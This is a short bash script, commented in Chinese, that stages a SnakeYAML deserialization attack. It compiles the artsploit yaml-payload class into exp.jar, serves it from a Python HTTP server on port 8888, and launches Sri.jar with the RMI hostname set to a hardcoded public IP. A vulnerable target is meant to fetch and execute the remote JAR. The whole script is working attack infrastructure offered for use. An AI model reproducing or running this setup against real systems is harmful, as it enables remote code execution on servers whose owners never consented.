#!/bin/bash
# 在服务器运行，分步运行也可

# 定义日志文件
LOG_FILE="1.txt"

# 编译 Java 文件，需要从https://github.com/artsploit/yaml-payload克隆下来
#
echo "[+] Compiling Java source file..." | tee -a $LOG_FILE
javac src/artsploit/AwesomeScriptEngineFactory.java >> $LOG_FILE 2>&1

# 创建 JAR 包
echo "[+] Creating JAR file..." | tee -a $LOG_FILE
jar -cvf exp.jar -C src/ . >> $LOG_FILE 2>&1

# 启动 HTTP 服务器
echo "[+] Starting HTTP server on port 8888..." | tee -a $LOG_FILE
python3 -m http.server 8888 >> $LOG_FILE 2>&1 &

# 运行 Java 程序
echo "[+] Running Java application with RMI hostname..." | tee -a $LOG_FILE
java -jar -Djava.rmi.server.hostname="123.206.100.143" Sri.jar >> $LOG_FILE 2>&1